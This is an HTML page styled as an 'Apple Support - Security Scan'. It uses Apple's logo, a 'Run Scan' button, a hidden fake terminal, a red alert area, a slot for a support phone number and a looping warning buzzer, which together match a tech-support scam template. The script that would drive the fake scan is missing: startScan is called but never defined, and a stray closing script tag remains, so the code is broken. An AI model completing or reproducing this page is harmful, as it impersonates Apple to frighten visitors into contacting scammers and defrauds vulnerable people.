<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Support - Security Scan</title>
    <style>
        body {
            font-family: monospace;
            background-color: black;
            color: white;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 500px;
            margin: auto;
            padding: 20px;
            background: #111;
            border-radius: 5px;
            box-shadow: 0 0 10px white;
        }
        .logo {
            width: 80px;
            margin-bottom: 10px;
        }
        .support-number {
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid white;
            border-radius: 5px;
            background: black;
            color: white;
            font-size: 16px;
            text-align: center;
        }
        button {
            background-color: white;
            color: black;
            padding: 10px 20px;
            font-size: 18px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: gray;
        }
        .terminal {
            display: none;
            text-align: left;
            padding: 15px;
            margin-top: 20px;
            background: #000;
            border: 2px solid white;
            border-radius: 5px;
            height: 250px;
            overflow-y: auto;
            font-size: 14px;
        }
        .final-report {
            display: none;
            margin-top: 20px;
            color: red;
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
        <h2>üçè Apple Support - Security Scan</h2>

        <button onclick="startScan()">Run Scan</button>

        <div class="terminal" id="terminal">
            <p>Initializing scan...</p>
        </div>

        <div class="final-report" id="finalReport"></div>
    </div>

    <!-- Warning Buzzer Sound -->
    <audio id="buzzer" loop>
        <source src="https://www.soundjay.com/button/beep-09.wav" type="audio/wav">
    </audio>

    </script>

</body>
</html>
